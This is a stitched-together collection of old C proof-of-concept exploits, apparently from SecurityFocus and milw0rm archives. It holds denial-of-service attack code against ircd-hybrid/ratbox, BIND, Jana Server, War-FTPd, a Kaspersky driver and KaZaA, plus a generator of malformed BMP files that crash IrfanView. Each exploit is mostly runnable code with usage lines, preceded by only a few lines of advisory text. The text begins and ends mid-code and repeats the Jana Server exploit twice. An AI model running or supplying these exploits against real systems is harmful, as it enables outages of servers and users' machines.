    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

source: http://www.securityfocus.com/bid/10572/info

A denial of service vulnerability exists in multiple ircd implementations. This exists because of an issue with the deallocation of buffers used by rate limiting mecahnisms in the ircd. This could result in exhaustion of memory resources on the system running the ircd.

This issue was reported to exist in ircd-hybrid version 7.0.1 and earlier, ircd-ratbox 1.5.1 and earlier, and ircd-ratbox 2.0rc6 and earlier.

// Proof of concept - remote ircd-hybrid-7/ircd-ratbox DoS
//
// ./kiddie-proofed - you'll need to correct a bug
//
// Tested on linux, should work with minor tweaks on other platforms
//
// -- Erik Sperling Johansen <einride@einride.org>

#include <stdlib.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/signal.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <string.h>
#include <time.h>

int done = 0;


void siginthandler(int x) {
  fprintf(stdout, "Exiting\n");
  done = 1;
}
void usage(const char * b) {
  fprintf(stderr, "%s ip port connectioncount\n", b);
  exit(1);
}

int makeconn(struct sockaddr_in * sin) {
  int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (s < 0) {
    perror("socket");
    return -1;
  }
  int n=1;
  if (ioctl(s, FIONBIO, &n, sizeof(n))) {
    perror("ioctl");
    close(s);
    return -1;
  }
  errno = 0;
  if ((connect(s, (struct sockaddr *) sin, sizeof(sin)) == -1)
    && (errno != EINPROGRESS)) {
    perror("connect");
    close(s);
    return -1;
  }
  return s;
};

int main(int argc, const char ** argv, const char ** envp) {
  fd_set wfd, rfd;
  FD_ZERO(&wfd);
  FD_ZERO(&rfd);
  if (argc != 4)
    usage(argv[0]);
  struct sockaddr_in sin;
  memset(&sin, 0, sizeof(sin));
  sin.sin_addr.s_addr = inet_addr(argv[1]);
  if (sin.sin_addr.s_addr == INADDR_NONE)
    usage(argv[0]);
  sin.sin_port = htons(atoi(argv[2]));
  sin.sin_family = AF_INET;
  int conncount = atoi(argv[3]);
  if ((conncount <= 0) || (conncount > FD_SETSIZE-5))
    usage(argv[0]);
  int * sockets = (int *) malloc(conncount * sizeof(int));
  int i, highsock = 0;
  char buf[65536];
  char dummy[65536];
  for (i=0; i<sizeof(buf)-1; i+=2) {
    buf[i] = ' ';
    buf[i+1] = '\n';
  }
  for (i = 0; i<conncount; ++i)
    sockets[i] = -1;
  highsock = -1;
  int CountConnects = 0, CountBytes = 0, CurCountBytes = 0;
  time_t Started = time(0), LastRep = time(0);
  signal(SIGPIPE, SIG_IGN);
  signal(SIGINT, siginthandler);
  while (!done) {
    fd_set w, r;
    if (highsock == -1) {
      for (i=0;i<conncount;++i) {
        if (sockets[i] < 0) {
          sockets[i] = makeconn(&sin);
          if (sockets[i] >= 0) {
            ++CountConnects;
            FD_SET(sockets[i], &wfd);
            FD_SET(sockets[i], &rfd);
          }
          if (highsock < sockets[i])
            highsock = sockets[i];
        }
      }
    }
    memcpy(&w, &wfd, sizeof(w));
    memcpy(&r, &rfd, sizeof(r));
    struct timeval tv = { 1, 0 };
    int c = select(highsock+1, &r, &w, 0, &tv);
    for (i = 0; (i<conncount) && (c > 0); ++i) {
      if (sockets[i] >= 0) {
        if (FD_ISSET(sockets[i], &w)) {
          int bytes = send(sockets[i], buf, sizeof(buf), 0);
          if (bytes > 0) {
            CountBytes += bytes;
            CurCountBytes += bytes;
          } else {
#ifndef NONOISE
            perror("send");
#endif
            FD_CLR(sockets[i], &wfd);
            FD_CLR(sockets[i], &rfd);
            close(sockets[i]);
#ifndef NONOISE
            fprintf(stdout, "(send) Lost conn on socket %i, 
reconnecting\n",
sockets[i]);
#endif
            sockets[i] = -1;
            highsock = -1;
          }
        }
      }
      if (sockets[i] >= 0) {
        if (FD_ISSET(sockets[i], &r)) {
          errno = 0;
          if (recv(sockets[i], dummy, sizeof(dummy), 0) <= 0) {
#ifndef NONOISE
            perror("recv");
#endif
            FD_CLR(sockets[i], &wfd);
            FD_CLR(sockets[i], &rfd);
            close(sockets[i]);
#ifndef NONOISE
            fprintf(stdout, "(recv) Lost conn on socket %i, 
reconnecting\n",
            sockets[i]);
#endif
            sockets[i] = -1;
            highsock = -1;
          }
        }
      }
    }

    if (time(0) - LastRep > 5) {
      fprintf(stdout, "%i connects made - Total: %i bytes, %li BPS - Last
period: %i bytes, %li BPS\n", CountConnects, CountBytes, CountBytes /
(time(0) - Started), CurCountBytes, CurCountBytes / (time(0) - LastRep));
      LastRep = time(0);
      CurCountBytes = 0;
    }
  }
  fprintf(stdout, "%i connects made - Total: %i bytes, %li BPS\n",
CountConnects, CountBytes, CountBytes / (time(0) - Started));

  return 0;
}
source: http://www.securityfocus.com/bid/23318/info

IrfanView is prone to multiple denial-of-service vulnerabilities because the application fails to properly handle malformed BMP image files.

Successfully exploiting these issues allows attackers to crash the affected application. Due to the nature of the issues, code execution may also be possible, but this has not been confirmed.

IrfanView 3.99 is affected; other versions may also be vulnerable. 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


struct BITMAPFILEHEADER {
unsigned int bfSize;
unsigned int bfReserved;
unsigned int bfOffBits;
};

struct BITMAPINFOHEADER {
unsigned int biSize;
unsigned int biWidth;
unsigned int biHeight;
unsigned short biPlanes;
unsigned short biBitCount;
unsigned int biCompression;
unsigned int biSizeImage;
unsigned int biXPelsPerMeter;
unsigned int biYPelsPerMeter;
unsigned int biClrUsed;
unsigned int biClrImportant;
};

void writebmp(char *filename, unsigned long width, unsigned long height, unsigned int bpp, unsigned int compression, unsigned char *palette, long numpalettecolors, unsigned char *data, long numdatabytes) {
BITMAPFILEHEADER fileheader;
BITMAPINFOHEADER infoheader;

memset(&fileheader,0,sizeof(BITMAPFILEHEADER));
memset(&infoheader,0,sizeof(BITMAPINFOHEADER));

unsigned char sig[2];
sig[0] = 'B';
sig[1] = 'M';

fileheader.bfSize = sizeof(sig)+sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER)+numpalettecolors*4+numdatabytes;
fileheader.bfOffBits = sizeof(sig)+sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER)+numpalettecolors*4;

infoheader.biSize = 40;
infoheader.biWidth = width;
infoheader.biHeight = height;
infoheader.biPlanes = 1;
infoheader.biBitCount = bpp;
infoheader.biCompression = compression;
infoheader.biClrUsed = numpalettecolors;

FILE *fp = fopen(filename,"wb");
fwrite(&sig,sizeof(sig),1,fp);
fwrite(&fileheader,sizeof(BITMAPFILEHEADER),1,fp);
fwrite(&infoheader,sizeof(BITMAPINFOHEADER),1,fp);
if(palette) fwrite(palette,numpalettecolors*4,1,fp);
fwrite(data,numdatabytes,1,fp);
fclose(fp);
}

int main() {
unsigned char * buf;
buf = (unsigned char *)malloc(4000000);
memset(buf,0,4000000);
unsigned char * buf2;
buf2 = (unsigned char *)malloc(4000000);
memset(buf2,0,4000000);

//overflows specifying too large palette
writebmp("ok8bit.bmp",16,16,8,0,buf,256,buf,16*16);
writebmp("paletteof1.bmp",16,16,8,0,buf,65535,buf,16*16);
writebmp("paletteof2.bmp",16,16,8,0,buf,1000000,buf,16*16);

//integer overflows with image dimensions
writebmp("ok24bit.bmp",16,16,24,0,NULL,0,buf,16*16*4);
writebmp("wh4intof.bmp",32769,32768,24,0,NULL,0,buf,4000000);
writebmp("wh3intof.bmp",37838,37838,24,0,NULL,0,buf,4000000);
writebmp("w4intof.bmp",1073741825,1,24,0,NULL,0,buf,4000000);
writebmp("w3intof.bmp",1431655767,1,24,0,NULL,0,buf,4000000);

//overflows with RLE encoded BMPs
buf2[0]=16;
buf2[1]=0;
writebmp("okRLE.bmp",16,1,8,1,buf,256,buf2,2);
for(long i=0;i<500000;i++) {
buf2[i*2]=255;
buf2[i*2+1]=0;
}
writebmp("rle8of1.bmp",16,1,8,1,buf,256,buf2,1000000);
buf2[0]=15;
buf2[1]=0;
for(long i=1;i<500000;i++) {
buf2[i*2]=255;
buf2[i*2+1]=0;
}
writebmp("rle8of2.bmp",16,1,8,1,buf,256,buf2,1000000);
memset(buf2,0,4000000);
buf2[0]=0;
buf2[1]=2;
buf2[2]=255;
buf2[3]=0;
for(long i=4;i<100000-1;) {
buf2[i]=0;
buf2[i+1]=254;
i+=255;
}
writebmp("rle8of3.bmp",16,1,8,1,buf,256,buf2,1000000);
memset(buf2,0,4000000);
for(long i=0;i<100000-1;) {
buf2[i]=0;
buf2[i+1]=254;
i+=255;
}
writebmp("rle8of4.bmp",16,1,8,1,buf,256,buf2,1000000);
} 
source: http://www.securityfocus.com/bid/6161/info

ISC BIND is vulnerable to a denial of service attack. When a DNS lookup is requested on a non-existant sub-domain of a valid domain and an OPT resource record with a large UDP payload is attached, the server may fail. 

/*
 *
 * bind_optdos.c
 *
 * OPT DoS Remote Exploit for BIND 8.3.0 - 8.3.3-REL
 * Based on the bug disclosed by ISS
 *
 * (c) Spybreak (spybreak@host.sk)   November/2002
 *
 * Proof of concept exploit code
 * For educational and testing purposes only!
 *
 *
 * Usage: ./bind_optdos domain target [udp_size]
 *
 * domain - should be a nonexistent subdomain
 * of an existing one, different from the target's,
 * or a domain whose authoritative name servers are
 * unreachable
 *
 *
 * Greetz to: sd, g00bER and hysteria.sk ;-)
 *
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <time.h>

#define         UDP_SIZE        65535
#define         OPT             41
#define         PORT            53
#define         MAXRESP         1024
#define         TIMEOUT         10

typedef struct {
        unsigned short rcode    : 4;
        unsigned short zero     : 3;
        unsigned short ra       : 1;
        unsigned short rd       : 1;
        unsigned short tc       : 1;
        unsigned short aa       : 1;
        unsigned short opcode   : 4;
        unsigned short qr       : 1;
} MSG_FLAGS;

typedef struct {
        unsigned short  id;
        unsigned short  flags;
        unsigned short  nqst;
        unsigned short  nansw;
        unsigned short  nauth;
        unsigned short  nadd;
} DNS_MSG_HDR;

void usage(char *argv0)
{
        printf("********************************************\n"
               "*    OPT DoS Exploit for BIND 8.3.[0-3]    *\n"
               "*       (c) Spybreak   November/2002       *\n"
               "********************************************\n");
        printf("\n%s domain target [udp_size]\n\n", argv0);
        exit(0);
}

void sig_alrm(int signo)
{
  printf("No response yet, the target BIND seems to be down\n");
  exit(0);
}

main(int argc, char **argv)
{
  struct sockaddr_in targ_addr;
  struct hostent *he;
  MSG_FLAGS fl;
  DNS_MSG_HDR hdr;
  unsigned char qname[512], buff[1024];
  unsigned char *bu, *dom, *dot;
  int msg_size, dom_len, sockfd, n;
  unsigned short udp_size = UDP_SIZE;
  char response[MAXRESP + 1];

  if (argc < 3)
        usage(argv[0]);
  if (argc == 4)
        udp_size = (unsigned short) atoi(argv[3]);

  if (!(he = gethostbyname(argv[2]))) {
        printf("Invalid target '%s'\n", argv[2]);
        exit(-1);
  }

  printf("Query on domain: %s\nTarget: %s\n", argv[1], argv[2]);
  printf("EDNS UDP size: %u\n", udp_size);

  if (argv[1][strlen(argv[1]) - 1] == '.')
        argv[1][strlen(argv[1]) - 1] = '\0';

  strncpy(qname + 1, argv[1], sizeof(qname) - 2);
  dom = qname;

  while (dot = (unsigned char *) strchr(dom + 1, '.')) {
        *dom = dot - dom - 1;
        dom = dot;
  }
  *dom = strlen(dom + 1);
  dom_len = dom - qname + strlen(dom + 1) + 2;

  bu = buff;

  fl.qr = 0;
  fl.opcode = 0;
  fl.aa = 0;
  fl.tc = 0;
  fl.rd = 1;
  fl.ra = 0;
  fl.zero = 0;
  fl.rcode = 0;

  srand(time(0));
  hdr.id = htons((unsigned short) (65535.0*rand()/(RAND_MAX+1.0)) + 1);
  hdr.flags = htons(*((unsigned short *) &fl));
  hdr.nqst = htons(1);
  hdr.nansw = 0;
  hdr.nauth = 0;
  hdr.nadd = htons(1);

  bcopy(&hdr, bu, sizeof(hdr));
  bu += sizeof(hdr);
  bcopy(qname, bu, dom_len);
  bu += dom_len;
  *(((unsigned short *) bu)++) = htons(1);              //query type
  *(((unsigned short *) bu)++) = htons(1);              //query class

                                                        //opt rr
  *bu++ = '\0';
  *(((unsigned short *) bu)++) = htons(OPT);            //type
  *(((unsigned short *) bu)++) = htons(udp_size);       //udp payload size
  *(((unsigned int *) bu)++) = htons(0);                //extended rcode and flags
  *(((unsigned short *) bu)++) = htons(0);              //rdlen

  msg_size = bu - buff;

  bzero(&targ_addr, sizeof(targ_addr));
  targ_addr.sin_family = AF_INET;
  targ_addr.sin_port = htons(PORT);
  targ_addr.sin_addr = *(struct in_addr *) he->h_addr;

  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd < 0) {
        perror("socket");
        exit(-1);
  }
  n = sendto(sockfd, buff, msg_size, 0, (struct sockaddr *) &targ_addr, (socklen_t) sizeof(targ_addr));
  if (n < 0) {
        perror("sendto");
        exit(-1);
  }

  printf("Datagram sent\nWaiting for response ...\n");

  signal(SIGALRM, sig_alrm);
  alarm(TIMEOUT);
  n = recvfrom(sockfd, response, MAXRESP, 0, NULL, NULL);
  alarm(0);

  printf("Response received, the target BIND seems to be still up\n");
  printf("Maybe the target is not an OPT DoS vulnerable BIND version,recursion disabled, or try to change domain/udp_size, ...\n");
  exit(0);
}

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}




    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER     "0.1"
#define CHR     '%'
#define GET1    "GET /"
#define GET2    " HTTP/1.0\r\n" \
                "\r\n"
#define BOOMSZ  300000
#define PNACPU  3
#define TIMEOUT 3



int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            attack,
            loop = 0;
    u_short port;
    u_char  *buff;


    setbuf(stdout, NULL);

    fputs("\n"
        "Jana Server <= 2.4.4 http/pna DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 4) {
        printf("\n"
            "Usage: %s <attack> <server> <port> [loop]\n"
            "\n"
            "Attack:\n"
            " 1 = http-server (temporary) CPU at 100%%, port 2506\n"
            " 2 = full server freeze caused by loop in pna-proxy, port 1090\n"
            "\n"
            "Example check:   janados 1 localhost 2506\n"
            "Example loop:    janados 1 localhost 2506 loop\n"
            "\n", argv[0]);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    attack = atoi(argv[1]);
    if(attack == 1) {
        printf(
            "- http-server attack\n"
            "- build HTTP request containing %d chars '%c'\n",
            BOOMSZ, CHR);
        len = sizeof(GET1) - 1 + BOOMSZ + sizeof(GET2);
        buff = malloc(len);
        if(!buff) std_err();
        memcpy(buff, GET1, sizeof(GET1) - 1);
        memset(buff + sizeof(GET1) - 1, CHR, BOOMSZ);
        memcpy(buff + sizeof(GET1) - 1 + BOOMSZ, GET2, sizeof(GET2));

    } else if(attack == 2) {
        fputs("- pna-proxy attack\n", stdout);
        buff = malloc(PNACPU);
        if(!buff) std_err();
        memset(buff, '\x7f', PNACPU);   // 0x7f7f, integer value
        len = PNACPU;

    } else {
        fputs("\nError: wrong type of attack chosen\n\n", stdout);
        exit(1);
    }

    port = atoi(argv[3]);

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    if(argc > 4) {
        loop = 1;
        fputs("- mega loop activated\n", stdout);
    }

    for(;;) {
        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd < 0) std_err();

        printf("- connect to %s:%hu ... ",
            inet_ntoa(peer.sin_addr), port);
        if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        fputs("ok\n", stdout);

        fputs("- send malformed request\n", stdout);
        if(send(sd, buff, len, 0)
          < 0) std_err();

        if(!loop) break;
        close(sd);
    }

    fputs("- check server:\n", stdout);
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2004-11-30]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER     "0.1"
#define CHR     '%'
#define GET1    "GET /"
#define GET2    " HTTP/1.0\r\n" \
                "\r\n"
#define BOOMSZ  300000
#define PNACPU  3
#define TIMEOUT 3



int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            attack,
            loop = 0;
    u_short port;
    u_char  *buff;


    setbuf(stdout, NULL);

    fputs("\n"
        "Jana Server <= 2.4.4 http/pna DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 4) {
        printf("\n"
            "Usage: %s <attack> <server> <port> [loop]\n"
            "\n"
            "Attack:\n"
            " 1 = http-server (temporary) CPU at 100%%, port 2506\n"
            " 2 = full server freeze caused by loop in pna-proxy, port 1090\n"
            "\n"
            "Example check:   janados 1 localhost 2506\n"
            "Example loop:    janados 1 localhost 2506 loop\n"
            "\n", argv[0]);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    attack = atoi(argv[1]);
    if(attack == 1) {
        printf(
            "- http-server attack\n"
            "- build HTTP request containing %d chars '%c'\n",
            BOOMSZ, CHR);
        len = sizeof(GET1) - 1 + BOOMSZ + sizeof(GET2);
        buff = malloc(len);
        if(!buff) std_err();
        memcpy(buff, GET1, sizeof(GET1) - 1);
        memset(buff + sizeof(GET1) - 1, CHR, BOOMSZ);
        memcpy(buff + sizeof(GET1) - 1 + BOOMSZ, GET2, sizeof(GET2));

    } else if(attack == 2) {
        fputs("- pna-proxy attack\n", stdout);
        buff = malloc(PNACPU);
        if(!buff) std_err();
        memset(buff, '\x7f', PNACPU);   // 0x7f7f, integer value
        len = PNACPU;

    } else {
        fputs("\nError: wrong type of attack chosen\n\n", stdout);
        exit(1);
    }

    port = atoi(argv[3]);

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    if(argc > 4) {
        loop = 1;
        fputs("- mega loop activated\n", stdout);
    }

    for(;;) {
        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd < 0) std_err();

        printf("- connect to %s:%hu ... ",
            inet_ntoa(peer.sin_addr), port);
        if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        fputs("ok\n", stdout);

        fputs("- send malformed request\n", stdout);
        if(send(sd, buff, len, 0)
          < 0) std_err();

        if(!loop) break;
        close(sd);
    }

    fputs("- check server:\n", stdout);
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


source: http://www.securityfocus.com/bid/966/info

War-FTPd 1.67 and possibly previous versions are susceptible to a buffer overflow DoS attack.

Due to improper bounds checking in the code that handles MKD and CWD commands, it is possible to remotely crash the server by submitting extremely long pathnames as arguments to either command. 

/*--------------------------------------------------------------*/
/* war-ftpd 1.66x4s and 1.67-3 DoS sample by crc "warftpd-dos.c"*/
/*--------------------------------------------------------------*/

#include    <stdio.h>
#include    <string.h>
#include    <winsock.h>
#include    <windows.h>

#define     FTP_PORT        21
#define     MAXBUF          8182
//#define     MAXBUF          553
#define     MAXPACKETBUF    32000
#define     NOP             0x90

void main(int argc,char *argv[])
{
    SOCKET               sock;
    unsigned long        victimaddr;
    SOCKADDR_IN          victimsockaddr;
    WORD                 wVersionRequested;
    int                  nErrorStatus;
    static unsigned char buf[MAXBUF],packetbuf[MAXPACKETBUF],*q;
    hostent              *victimhostent;
    WSADATA              wsa;

    if (argc < 3){
        printf("Usage: %s TargetHost UserName Password\n",argv[0]); exit(1);
    }

    wVersionRequested = MAKEWORD(1, 1);
    nErrorStatus = WSAStartup(wVersionRequested, &wsa);
    if (atexit((void (*)(void))(WSACleanup))) {
        fprintf(stderr,"atexit(WSACleanup)failed\n"); exit(-1);
    }

    if ( nErrorStatus != 0 ) {
        fprintf(stderr,"Winsock Initialization failed\n"); exit(-1);
    }

    if ((sock=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){
        fprintf(stderr,"Can't create socket.\n"); exit(-1);
    }


    victimaddr = inet_addr((char*)argv[1]);
    if (victimaddr == -1) {
        victimhostent = gethostbyname(argv[1]);
        if (victimhostent == NULL) {
            fprintf(stderr,"Can't resolve specified host.\n"); exit(-1);
        }
        else
            victimaddr = *((unsigned long *)((victimhostent->h_addr_list)[0]));
    }

    victimsockaddr.sin_family        = AF_INET;
    victimsockaddr.sin_addr.s_addr  = victimaddr;
    victimsockaddr.sin_port  = htons((unsigned short)FTP_PORT);
    memset(victimsockaddr.sin_zero,(int)0,sizeof(victimsockaddr.sin_zero));

    if(connect(sock,(struct sockaddr *)&victimsockaddr,sizeof(victimsockaddr)) == SOCKET_ERROR){
        fprintf(stderr,"Connection refused.\n"); exit(-1);
    }

    printf("Attacking war-ftpd ...\n");
    recv(sock,(char *)packetbuf,MAXPACKETBUF,0);
    sprintf((char *)packetbuf,"USER %s\r\n",argv[2]);
    send(sock,(char *)packetbuf,strlen((char *)packetbuf),0);
    recv(sock,(char *)packetbuf,MAXPACKETBUF,0);
    sprintf((char *)packetbuf,"PASS %s\r\n",argv[3]);
    send(sock,(char *)packetbuf,strlen((char *)packetbuf),0);
    recv(sock,(char *)packetbuf,MAXPACKETBUF,0);

    memset(buf,NOP,MAXBUF); buf[MAXBUF-1]=0;

    sprintf((char *)packetbuf,"CWD %s\r\n",buf);
    send(sock,(char *)packetbuf,strlen((char *)packetbuf),0);

    Sleep(100);
    shutdown(sock, 2);
    closesocket(sock);
    WSACleanup();
    printf("done.\n");
}
#include <stdio.h>
#include <windows.h>
#include <winioctl.h>
#include <stdlib.h>
#include <string.h>

/*
Program : Kaspersky Anti-Virus 2010 9.0.0.463
Homepage : http://www.kaspersky.com
Discovery : 2009/09/29
Author Contacted : 2009/10/01
Found by : Heurs
This Advisory : Heurs
Contact : s.leberre@sysdream.com


//----- Application description


The most trusted virus and spyware protection - premium protection
against viruses, spyware, Trojans, worms, bots and more. Also includes
comprehensive phishing and identity theft defense and superfast performance.

//----- Description of vulnerability

kl1.sys driver don't check inputs address of an IOCTL. An exception can be
thrown if we modify one or two DWORDs.
With my test I can't do best exploitation than a BSOD.

//----- Credits

http://www.sysdream.com
http://ghostsinthestack.org

s.leberre at sysdream dot com
heurs at ghostsinthestack dot org

//----- Greetings

Trance

*/

int __cdecl main(int argc, char* argv[])
{
HANDLE hDevice = (HANDLE) 0xffffffff;
DWORD NombreByte;
DWORD Crashing[] = {
0x3ff8f44a, 0x9d4ad6c2, 0xd883673e, 0x0a06ac2a,
0x3d4552b1, 0x3b2f314e, 0xeb6dfc7e, 0xfcfdf961,
0xde0f4405, 0xaa76f8eb, 0x2dbc6ead, 0x534047f9,
0xb5ebadc5
};
BYTE Out[0x20];

printf("Local DoS - Kaspersky 2010 9.0.0.463\n\n");
hDevice = CreateFile("\\\\.\\kimul25",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);

DeviceIoControl(hDevice,0x0022c008,Crashing,sizeof(Crashing),Out,sizeof(Out),&NombreByte,NULL);

printf("Sploit Send.\nhDevice = %x\n", hDevice);
CloseHandle(hDevice);
getch();
return 0;
}source: http://www.securityfocus.com/bid/5317/info

KaZaA may consume large amounts of CPU when processing a sequence of large messages. It is possible for an attacker to flood a vulnerable system with a large number of messages, resulting in a denial of service condition.

/*
   kazaa denial of service attack
   by Josh and omega
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <stdarg.h>

#define PORT 1214


int main(int argc, char *argv[])
{
   int fd, numbytes, randnum, k;
   struct hostent *host;
   struct sockaddr_in them;
   char buf2[4026];
   char buf[5000];
   char *bigboy;
   int i, size, j;


   memset(buf2, 'a', sizeof(buf2));
   buf2[sizeof(buf2)-1]='\0';
   srand(time(NULL));

   if (argc < 5)
   {
      fprintf(stderr,"usage: %s <hostname> <(this*4026) bytes per message> <username_of_target> <number_of_messages>\n", argv[0]);
      exit(1);
   }
   if ((host=gethostbyname(argv[1])) == NULL)
   {
      perror("gethostbyname");
      exit(1);
   }

   them.sin_family = AF_INET;
   them.sin_port = htons(PORT);
   them.sin_addr = *((struct in_addr *)host->h_addr);
   memset(&(them.sin_zero), '\0', 8);


   size=(4042*atoi(argv[2]))+280+1;
   bigboy=(char *)malloc(size);

